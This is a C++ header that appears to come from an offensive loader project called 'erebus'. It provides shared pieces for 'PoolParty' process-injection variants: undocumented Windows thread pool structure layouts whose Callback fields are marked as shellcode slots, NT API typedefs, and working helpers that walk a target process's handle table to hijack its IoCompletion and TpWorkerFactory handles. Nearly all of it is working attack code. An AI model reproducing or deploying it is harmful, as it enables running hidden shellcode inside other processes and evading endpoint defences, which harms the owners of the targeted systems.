#ifndef EREBUS_INJECTION_POOLPARTY_COMMON_HPP
#define EREBUS_INJECTION_POOLPARTY_COMMON_HPP
#pragma once

// Shared structures, NT typedefs, and static helper functions used by all
// PoolParty injection variants.  Guarded so these compile only for the two
// types that need them; dead copies in the "wrong" TU are stripped by
// -Wl,--gc-sections.

#include "../loader.hpp"

#if CONFIG_INJECTION_TYPE == 4 || CONFIG_INJECTION_TYPE == 9

namespace erebus {

// ====================
// CONSTANTS
// ====================

#ifndef WORKER_FACTORY_RELEASE_WORKER
#define WORKER_FACTORY_RELEASE_WORKER    0x0001
#define WORKER_FACTORY_WAIT              0x0002
#define WORKER_FACTORY_SET_INFORMATION   0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER      0x0010
#define WORKER_FACTORY_SHUTDOWN          0x0020
#endif

#ifndef WORKER_FACTORY_ALL_ACCESS
#define WORKER_FACTORY_ALL_ACCESS        (STANDARD_RIGHTS_REQUIRED | 0x3F)
#endif

#ifndef IO_COMPLETION_ALL_ACCESS
#define IO_COMPLETION_ALL_ACCESS         0x001F0003
#endif

// Job notification message used as ApcContext by TpJobObjectApc (type 9).
// The thread pool dispatcher routes the dequeued packet through
// TpJobNotifications when it sees a non-NULL ApcContext that matches a
// JOB_OBJECT_MSG_* value; any valid message works; ACTIVE_PROCESS_LIMIT (3)
// fires without needing a real job object associated to the target.
#ifndef JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT
#define JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT 3
#endif

// ====================
// SHARED STRUCTURES
// ====================

typedef struct _PP_WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} PP_WORKER_FACTORY_BASIC_INFORMATION, *PPP_WORKER_FACTORY_BASIC_INFORMATION;

typedef struct _PP_PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PP_PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPP_PROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PP_PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PP_PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PP_PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _PP_PUBLIC_OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG Reserved[22];
} PP_PUBLIC_OBJECT_TYPE_INFORMATION, *PPP_PUBLIC_OBJECT_TYPE_INFORMATION;

// Base structure embedded at the start of every TP_* callback object.
typedef struct _PP_TP_TASK {
    PVOID      Callbacks;       // +0x00
    UINT32     NumaNode;        // +0x08
    UINT8      IdealProcessor;  // +0x0C
    char       Padding[3];      // +0x0D
    LIST_ENTRY ListEntry;       // +0x10
    // Total: 0x20 bytes on x64
} PP_TP_TASK, *PPP_TP_TASK;

// TP_DIRECT — RemoteTpDirectInsertion (type 4).
// ApcContext must be NULL; Callback lives at offset 0x30.
typedef struct _PP_TP_DIRECT {
    PP_TP_TASK Task;                      // +0x00 (0x20)
    UINT64     Lock;                       // +0x20
    LIST_ENTRY IoCompletionInformationList; // +0x28
    PVOID      Callback;                   // +0x38 <- shellcode
    UINT32     NumaNode;                   // +0x40
    UINT8      IdealProcessor;             // +0x44
    char       Padding[3];                 // +0x45
} PP_TP_DIRECT, *PPP_TP_DIRECT;

// TP_JOB — TpJobObjectApc (type 9).
// ApcContext must be JOB_OBJECT_MSG_* for the thread pool dispatcher to route
// the dequeued packet through TpJobNotifications; Callback lives at 0x50.
typedef struct _PP_TP_JOB {
    PP_TP_TASK Task;           // +0x00 (0x20)
    UINT64     Lock;            // +0x20
    LIST_ENTRY JobListEntry;    // +0x28 (0x10)
    PVOID      CompletionKey;   // +0x38
    HANDLE     CompletionPort;  // +0x40
    ULONG      MessagesToFollow;// +0x48  (JOBOBJECTINFOCLASS = ULONG)
    LONG       NumSend;         // +0x4C
    PVOID      Callback;        // +0x50 <- shellcode
    UINT32     NumaNode;        // +0x58
    UINT8      IdealProcessor;  // +0x5C
    char       Padding[3];      // +0x5D
    // Total: 0x60 bytes on x64
} PP_TP_JOB, *PPP_TP_JOB;

// ====================
// NT API TYPEDEFS
// ====================

typedef NTSTATUS(NTAPI* typeNtQueryInformationWorkerFactory)(
    _In_      HANDLE WorkerFactoryHandle,
    _In_      ULONG  WorkerFactoryInformationClass,
    _Out_     PVOID  WorkerFactoryInformation,
    _In_      ULONG  WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* typeNtSetInformationWorkerFactory)(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ ULONG  WorkerFactoryInformationClass,
    _In_ PVOID  WorkerFactoryInformation,
    _In_ ULONG  WorkerFactoryInformationLength
);

typedef NTSTATUS(NTAPI* typeNtQueryObject)(
    _In_opt_  HANDLE Handle,
    _In_      ULONG  ObjectInformationClass,
    _Out_opt_ PVOID  ObjectInformation,
    _In_      ULONG  ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* typeNtDuplicateObject)(
    _In_     HANDLE      SourceProcessHandle,
    _In_     HANDLE      SourceHandle,
    _In_opt_ HANDLE      TargetProcessHandle,
    _Out_opt_ PHANDLE    TargetHandle,
    _In_     ACCESS_MASK DesiredAccess,
    _In_     ULONG       HandleAttributes,
    _In_     ULONG       Options
);

typedef NTSTATUS(NTAPI* typeZwSetIoCompletion)(
    _In_     HANDLE     IoCompletionHandle,
    _In_opt_ PVOID      KeyContext,
    _In_opt_ PVOID      ApcContext,
    _In_     NTSTATUS   IoStatus,
    _In_     ULONG_PTR  IoStatusInformation
);

// ====================
// HELPER FUNCTIONS
// ====================

// Enumerate the target process handle table and duplicate the first handle
// whose object type matches wsObjectType.  Returns NULL on failure.
static HANDLE HijackProcessHandle(
    IN HANDLE         hTargetProcess,
    IN const wchar_t* wsObjectType,
    IN DWORD          dwDesiredAccess)
{
    HMODULE ntdll = ImportModule("ntdll.dll");
    if (!ntdll) {
        LOG_ERROR("HijackProcessHandle: no ntdll");
        return NULL;
    }

    ImportFunction(ntdll, NtQueryInformationProcess, typeNtQueryInformationProcess);
    ImportFunction(ntdll, NtQueryObject,              typeNtQueryObject);
    ImportFunction(ntdll, NtDuplicateObject,          typeNtDuplicateObject);

    if (!NtQueryInformationProcess || !NtQueryObject || !NtDuplicateObject) {
        LOG_ERROR("HijackProcessHandle: unresolved NT functions");
        return NULL;
    }

    ULONG    bufferSize   = 0x10000;
    PVOID    buffer       = NULL;
    NTSTATUS status;
    ULONG    returnLength = 0;

    do {
        if (buffer) free(buffer);
        buffer = malloc(bufferSize);
        if (!buffer) {
            LOG_ERROR("HijackProcessHandle: malloc failed");
            return NULL;
        }
        status = NtQueryInformationProcess(
            hTargetProcess,
            (PROCESSINFOCLASS)ProcessHandleInformation,
            buffer, bufferSize, &returnLength);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
            bufferSize = returnLength + 0x1000;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        LOG_ERROR("NtQueryInformationProcess failed: 0x%08lX", status);
        free(buffer);
        return NULL;
    }

    PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION snap =
        (PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION)buffer;

    for (ULONG_PTR i = 0; i < snap->NumberOfHandles; i++) {
        HANDLE hDup = NULL;
        status = NtDuplicateObject(
            hTargetProcess, snap->Handles[i].HandleValue,
            GetCurrentProcess(), &hDup,
            dwDesiredAccess, 0, 0);
        if (!NT_SUCCESS(status) || !hDup) continue;

        BYTE   typeBuf[512] = { 0 };
        status = NtQueryObject(hDup, 2 /* ObjectTypeInformation */,
                               typeBuf, sizeof(typeBuf), NULL);
        if (!NT_SUCCESS(status)) { CloseHandle(hDup); continue; }

        PPP_PUBLIC_OBJECT_TYPE_INFORMATION ti =
            (PPP_PUBLIC_OBJECT_TYPE_INFORMATION)typeBuf;
        if (ti->TypeName.Buffer && wcscmp(ti->TypeName.Buffer, wsObjectType) == 0) {
            LOG_SUCCESS("Hijacked %ls handle: 0x%p", wsObjectType, hDup);
            free(buffer);
            return hDup;
        }
        CloseHandle(hDup);
    }

    free(buffer);
    return NULL;
}

static HANDLE HijackIoCompletionHandle(IN HANDLE hTargetProcess) {
    return HijackProcessHandle(hTargetProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
}

static HANDLE HijackWorkerFactoryHandle(IN HANDLE hTargetProcess) {
    return HijackProcessHandle(hTargetProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
}

// Returns TRUE if the target process has an active Windows thread pool
// (i.e. at least one IoCompletion handle exists in its handle table).
static BOOL ProcessHasThreadPool(IN HANDLE hProcess) {
    HANDLE h = HijackIoCompletionHandle(hProcess);
    if (h) { CloseHandle(h); return TRUE; }
    return FALSE;
}

} // namespace erebus

#endif // CONFIG_INJECTION_TYPE == 4 || CONFIG_INJECTION_TYPE == 9
#endif // EREBUS_INJECTION_POOLPARTY_COMMON_HPP
